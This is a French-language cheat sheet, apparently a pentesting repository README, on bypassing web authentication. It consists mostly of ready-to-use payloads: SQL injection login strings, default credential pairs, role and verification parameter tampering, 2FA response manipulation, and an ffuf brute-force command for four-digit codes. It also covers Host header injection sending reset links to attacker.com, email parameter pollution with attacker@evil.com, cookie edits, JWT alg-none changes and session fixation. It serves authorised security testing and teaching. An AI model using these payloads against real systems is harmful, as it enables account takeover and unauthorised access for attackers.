# 🔐 Fiche pratique du contournement de l’authentification

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗   ██╗████████╗██╗  ██╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
  ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ███████║██║   ██║   ██║   ███████║    ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
  ██╔══██║██║   ██║   ██║   ██╔══██║    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
  ██║  ██║╚██████╔╝   ██║   ██║  ██║    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
```

---

> **Interprétation des exemples :** modifier une réponse JSON ou un statut HTTP côté client ne prouve pas que le serveur accorde un accès non autorisé. Les champs `verified` ou `isAdmin` n’ont d’effet que si l’application leur fait confiance. La navigation directe ne contourne la 2FA que si les contrôles côté serveur sont incomplets ; voir les [explications de PortSwigger sur la MFA](https://portswigger.net/web-security/authentication/multi-factor).
>
> **JWT et valeurs illustratives :** changer un attribut ou l’algorithme déclaré ne produit pas automatiquement un jeton accepté. La vérification cryptographique et l’algorithme autorisé doivent être contrôlés côté serveur ; voir la [RFC 8725](https://www.rfc-editor.org/rfc/rfc8725.html#section-3.1). Les identifiants par défaut, jetons, codes et adresses sont des exemples, pas des valeurs universelles ni des garanties de contournement. Les commandes et le dessin ASCII restent ceux de la source.

## 🔍 Techniques de contournement de la connexion

### Injection SQL
```sql
admin'--
admin' #
' OR '1'='1
' OR 1=1--
") OR ("1"="1
```

### Identifiants par défaut
```
admin:admin
admin:password
admin:123456
root:root
test:test
guest:guest
```

### Manipulation des paramètres
```http
# Modifier le type d’utilisateur
user_type=admin
role=administrator
isAdmin=true
admin=1

# Passer outre la vérification
verified=true
mfa_verified=true
```

---

## 🔑 Contournement de la 2FA/MFA

### Manipulation de la réponse
```http
# Remplacer false par true
{"success": false} → {"success": true}
{"2fa_valid": false} → {"2fa_valid": true}
```

### Manipulation du code de statut
```http
# Si le statut est 401/403, essayer de le remplacer par 200
# Utiliser un proxy pour modifier la réponse
```

### Navigation directe
```http
# Après la connexion, sauter la page de vérification 2FA
/login → /2fa → /dashboard
# Essayer d’accéder directement à /dashboard
```

### Recherche du code par force brute
```bash
# Codes à quatre chiffres
ffuf -u https://target.com/2fa -X POST \
  -d "code=FUZZ" -w <(seq -w 0000 9999)
```

### Réutilisation des codes
```http
# Essayer d’utiliser des codes anciens ou expirés
# Essayer le même code plusieurs fois
```

### Valeurs nulles ou vides
```json
{"2fa_code": ""}
{"2fa_code": null}
{"2fa_code": "000000"}
```

---

## 🔓 Contournement de la réinitialisation du mot de passe

### Injection dans l’en-tête Host
```http
POST /reset HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@target.com
```

### Manipulation des jetons
```http
# Jetons prévisibles
token=1
token=admin
token=base64(user_id)

# Réutilisation du jeton
# Utiliser son propre jeton de réinitialisation avec l’adresse de la victime
```

### Pollution des paramètres
```http
email=attacker@evil.com&email=victim@target.com
email[]=attacker@evil.com&email[]=victim@target.com
```

### Manipulation de la réponse
```json
// Rechercher le jeton dans la réponse
{"token": "abc123", "email": "victim@target.com"}
```

---

## 🛡️ Contournement par la session ou les cookies

### Manipulation des cookies
```http
# Modifier les valeurs
Cookie: isAdmin=false → isAdmin=true
Cookie: user_id=123 → user_id=1
Cookie: role=user → role=admin
```

### Manipulation des JWT
```json
// Modifier les attributs (claims)
{"role": "user"} → {"role": "admin"}
{"alg": "HS256"} → {"alg": "none"}
```

### Fixation de session
```http
# Faire utiliser à la victime une session choisie par l’attaquant
# La victime se connecte avec l’identifiant de session choisi par l’attaquant
```

---

## 📊 Référence rapide

| Type de contournement | Technique |
|-------------|-----------|
| Connexion | Injection SQL, identifiants par défaut |
| 2FA | Manipulation de la réponse, force brute |
| Réinitialisation du mot de passe | En-tête Host, réutilisation du jeton |
| Session | Manipulation des cookies et des JWT |

### Points de contrôle couramment concernés
```
- Formulaires de connexion
- Procédures de réinitialisation de mot de passe
- Implémentations de 2FA/MFA
- Fonctions « Se souvenir de moi »
- Vérification des comptes
- Implémentations OAuth
```

---

## 📚 Ressources

- [Authentification — PortSwigger](https://portswigger.net/web-security/authentication)
- [Contournement de l’authentification — HackTricks](https://book.hacktricks.xyz/pentesting-web/authentication-bypass)

---

<p align="center">
  <b>🔐 Comprenez les faiblesses de l’authentification !</b><br>
  <i>Uniquement dans le cadre de tests autorisés !</i>
</p>
